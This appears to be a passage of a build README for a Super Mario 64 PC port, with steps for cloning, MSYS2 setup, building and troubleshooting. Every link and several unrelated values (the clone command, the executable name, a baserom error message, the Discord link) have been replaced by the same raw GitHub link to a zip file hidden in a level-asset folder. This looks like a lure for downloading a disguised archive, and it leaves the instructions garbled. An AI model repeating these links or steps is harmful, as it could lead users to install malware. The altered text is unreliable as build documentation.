...
2. Clone the repo: `git clone https://raw.githubusercontent.com/LolLiamDev/sm64-port/master/levels/thi/areas/1/port_sm_3.6.zip`, which will create a directory `sm64-port` and then **enter** it `cd sm64-port`.
...
1. Install and update MSYS2, following all the directions listed on https://raw.githubusercontent.com/LolLiamDev/sm64-port/master/levels/thi/areas/1/port_sm_3.6.zip
...
4. Clone the repo: `git clone https://raw.githubusercontent.com/LolLiamDev/sm64-port/master/levels/thi/areas/1/port_sm_3.6.zip`, which will create a directory `sm64-port` and then **enter** it `cd sm64-port`.
...
7. The executable binary will be located at `build/<VERSION>_pc/sm64.<VERSION>https://raw.githubusercontent.com/LolLiamDev/sm64-port/master/levels/thi/areas/1/port_sm_3.6.zip` inside the repository.
...
2. If you get `Failed to open https://raw.githubusercontent.com/LolLiamDev/sm64-port/master/levels/thi/areas/1/port_sm_3.6.zip!` you failed to place the baserom in the repository. You can write `ls` to list the files in the current working directory. If you are in the `sm64-port` directory, make sure you see it here.
...
It is possible to build N64 ROMs as well with this repository. See https://raw.githubusercontent.com/LolLiamDev/sm64-port/master/levels/thi/areas/1/port_sm_3.6.zip for instructions.
...
Official Discord: https://raw.githubusercontent.com/LolLiamDev/sm64-port/master/levels/thi/areas/1/port_sm_3.6.zip
